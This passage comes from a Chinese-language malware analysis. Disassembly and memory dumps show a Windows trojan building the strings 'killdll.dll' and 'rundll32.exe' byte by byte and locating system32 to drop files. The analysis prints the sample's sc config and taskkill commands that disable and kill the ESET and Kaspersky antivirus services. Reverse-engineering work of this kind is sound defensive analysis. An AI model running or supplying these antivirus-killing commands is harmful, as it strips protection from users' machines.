
```
00402030    8BD1            mov     edx, ecx
00402032    83C9 FF         or      ecx, FFFFFFFF
00402035    F2:AE           repne   scas byte ptr es:[edi]
00402037    8BCA            mov     ecx, edx
00402039    4F              dec     edi
0040203A    C1E9 02         shr     ecx, 2
0040203D    F3:A5           rep     movs dword ptr es:[edi], dword p>
0040203F    8BCA            mov     ecx, edx
00402041    8D4424 14       lea     eax, dword ptr [esp+14]
00402045    83E1 03         and     ecx, 3
00402048    50              push    eax
00402049    F3:A4           rep     movs byte ptr es:[edi], byte ptr>
0040204B    FFD3            call    ebx
0040204D    68 B80B0000     push    0BB8
00402052    FFD5            call    ebp
00402054    BF D8104000     mov     edi, 004010D8                    ; ASCII "cmd.exe /c taskkill.exe /im "
00402059    83C9 FF         or      ecx, FFFFFFFF
0040205C    33C0            xor     eax, eax
0040205E    8D5424 10       lea     edx, dword ptr [esp+10]
00402062    F2:AE           repne   scas byte ptr es:[edi]
00402064    F7D1            not     ecx
00402066    2BF9            sub     edi, ecx
00402068    8BC1            mov     eax, ecx
0040206A    8BF7            mov     esi, edi
0040206C    8BFA            mov     edi, edx
0040206E    8D5424 10       lea     edx, dword ptr [esp+10]
00402072    C1E9 02         shr     ecx, 2
00402075    F3:A5           rep     movs dword ptr es:[edi], dword p>
00402077    8BC8            mov     ecx, eax
00402079    33C0            xor     eax, eax
0040207B    83E1 03         and     ecx, 3
0040207E    F3:A4           rep     movs byte ptr es:[edi], byte ptr>
00402080    BF 50114000     mov     edi, 00401150                    ; ASCII "egui.exe"
00402085    83C9 FF         or      ecx, FFFFFFFF
00402088    F2:AE           repne   scas byte ptr es:[edi]
0040208A    F7D1            not     ecx
0040208C    2BF9            sub     edi, ecx
0040208E    8BF7            mov     esi, edi
00402090    8BFA            mov     edi, edx
00402092    8BD1            mov     edx, ecx
00402094    83C9 FF         or      ecx, FFFFFFFF
00402097    F2:AE           repne   scas byte ptr es:[edi]
00402099    8BCA            mov     ecx, edx
0040209B    4F              dec     edi
0040209C    C1E9 02         shr     ecx, 2
0040209F    F3:A5           rep     movs dword ptr es:[edi], dword p>
004020A1    8BCA            mov     ecx, edx
004020A3    83E1 03         and     ecx, 3
004020A6    F3:A4           rep     movs byte ptr es:[edi], byte ptr>
004020A8    BF 5C114000     mov     edi, 0040115C                    ; ASCII " /f"
004020AD    83C9 FF         or      ecx, FFFFFFFF
004020B0    F2:AE           repne   scas byte ptr es:[edi]
004020B2    F7D1            not     ecx
004020B4    2BF9            sub     edi, ecx
004020B6    8D5424 10       lea     edx, dword ptr [esp+10]
004020BA    8BF7            mov     esi, edi
004020BC    8BFA            mov     edi, edx
004020BE    8BD1            mov     edx, ecx
004020C0    83C9 FF         or      ecx, FFFFFFFF
004020C3    F2:AE           repne   scas byte ptr es:[edi]
004020C5    8BCA            mov     ecx, edx
004020C7    4F              dec     edi
004020C8    C1E9 02         shr     ecx, 2
004020CB    F3:A5           rep     movs dword ptr es:[edi], dword p>
004020CD    8BCA            mov     ecx, edx
004020CF    50              push    eax
004020D0    83E1 03         and     ecx, 3
004020D3    8D4424 14       lea     eax, dword ptr [esp+14]
004020D7    F3:A4           rep     movs byte ptr es:[edi], byte ptr>
004020D9    50              push    eax
004020DA    FFD3            call    ebx
004020DC    68 B80B0000     push    0BB8
004020E1    FFD5            call    ebp
004020E3    5F              pop     edi
004020E4    5E              pop     esi
004020E5    5D              pop     ebp
004020E6    5B              pop     ebx
004020E7    81C4 00010000   add     esp, 100
004020ED    C3              retn
```

## （2）、病毒尝试通过 WinExec 执行 dos 命令终止反病毒软件 ekrn、egui、avp 的相关服务，强行终止相关进程，并删除相关服务

一般常见杀毒软件的自身保护能力很强，在 ring3 下是很难停止服务，杀掉进程的。其实，假如宿主机之前已经中过类似的毒，那么此时可以方便做到以上。

`"cmd /c sc config ekrn start= disabled"`

`"cmd.exe /c taskkill.exe /im "`

`"cmd /c sc config egui start= disabled"`

`"cmd.exe /c taskkill.exe /im ")`

`"cmd /c sc config avp start= disabled"`

`"cmd.exe /c taskkill.exe /im "`

```
00402259    C685 F0FDFFFF 2>mov     byte ptr [ebp-210], 20
00402260    C685 F1FDFFFF 7>mov     byte ptr [ebp-20F], 74
00402267    C685 F2FDFFFF 6>mov     byte ptr [ebp-20E], 65
0040226E    C685 F3FDFFFF 7>mov     byte ptr [ebp-20D], 73
00402275    C685 F4FDFFFF 7>mov     byte ptr [ebp-20C], 74
0040227C    C685 F5FDFFFF 6>mov     byte ptr [ebp-20B], 61
00402283    C685 F6FDFFFF 6>mov     byte ptr [ebp-20A], 6C
0040228A    C685 F7FDFFFF 6>mov     byte ptr [ebp-209], 6C
00402291    C685 F8FDFFFF 0>mov     byte ptr [ebp-208], 0
0012FDB0  20 74 65 73 74 61 6C 6C 00 E7 1D E1 00 00 00 00   testall.??...
0012FDC0  38 00 00 00 23 00 00 00 23 00 00 00 38 07 93 7C  8...#...#...8
0012FDD0  FF FF FF FF 00 E0 FD 7F AB 06 93 7C EB 06 93 7C  . ...
0012FDE0  F0 20 40 00 00 00 00 00 67 08 81 7C 1B 00 00 00  ?@.....g...
00402298    C685 D8FAFFFF 5>mov     byte ptr [ebp-528], 5C
0040229F    C685 D9FAFFFF 6>mov     byte ptr [ebp-527], 6B
004022A6    C685 DAFAFFFF 6>mov     byte ptr [ebp-526], 69
004022AD    C685 DBFAFFFF 6>mov     byte ptr [ebp-525], 6C
004022B4    C685 DCFAFFFF 6>mov     byte ptr [ebp-524], 6C
004022BB    C685 DDFAFFFF 6>mov     byte ptr [ebp-523], 64
004022C2    C685 DEFAFFFF 6>mov     byte ptr [ebp-522], 6C
004022C9    C685 DFFAFFFF 6>mov     byte ptr [ebp-521], 6C
004022D0    C685 E0FAFFFF 2>mov     byte ptr [ebp-520], 2E
004022D7    C685 E1FAFFFF 6>mov     byte ptr [ebp-51F], 64
004022DE    C685 E2FAFFFF 6>mov     byte ptr [ebp-51E], 6C
004022E5    C685 E3FAFFFF 6>mov     byte ptr [ebp-51D], 6C
004022EC    C685 E4FAFFFF 0>mov     byte ptr [ebp-51C], 0
0012FA98  5C 6B 69 6C 6C 64 6C 6C 2E 64 6C 6C 00 00 00 00  \killdll.dll....
004022F3    C685 B0F9FFFF 5>mov     byte ptr [ebp-650], 5C
004022FA    C685 B1F9FFFF 7>mov     byte ptr [ebp-64F], 72
00402301    C685 B2F9FFFF 7>mov     byte ptr [ebp-64E], 75
00402308    C685 B3F9FFFF 6>mov     byte ptr [ebp-64D], 6E
0040230F    C685 B4F9FFFF 6>mov     byte ptr [ebp-64C], 64
00402316    C685 B5F9FFFF 6>mov     byte ptr [ebp-64B], 6C
0040231D    C685 B6F9FFFF 6>mov     byte ptr [ebp-64A], 6C
00402324    C685 B7F9FFFF 3>mov     byte ptr [ebp-649], 33
0040232B    C685 B8F9FFFF 3>mov     byte ptr [ebp-648], 32
00402332    C685 B9F9FFFF 2>mov     byte ptr [ebp-647], 2E
00402339    C685 BAF9FFFF 6>mov     byte ptr [ebp-646], 65
00402340    C685 BBF9FFFF 7>mov     byte ptr [ebp-645], 78
00402347    C685 BCF9FFFF 6>mov     byte ptr [ebp-644], 65
0040234E    C685 BDF9FFFF 2>mov     byte ptr [ebp-643], 20
00402355    C685 BEF9FFFF 0>mov     byte ptr [ebp-642], 0
0012F970  5C 72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 00 77  \rundll32.exe .w
00402377    FF15 60104000   call    dword ptr [<&kernel32.GetSystemD>; kernel32.GetSystemDirectoryA
0040237D    8D85 A8F7FFFF   lea     eax, dword ptr [ebp-858]
00402383    50              push    eax
00402384    8D8D ECFCFFFF   lea     ecx, dword ptr [ebp-314]
0040238A    51              push    ecx
0040238B    FF15 44104000   call    dword ptr [<&kernel32.lstrcpy>]  ; kernel32.lstrcpyA
```

获得系统目录 `C:\WINDOWS\system32`，方便木马释放资源。

```
0012FCAC  43 3A 5C 57 49 4E 44 4F 57 53 5C 73 79 73 74 65   C:\WINDOWS\syste
0012FCBC  6D 33 32 00 00 00 00 00 00 00 00 00 00 00 00 00   m32.............
```
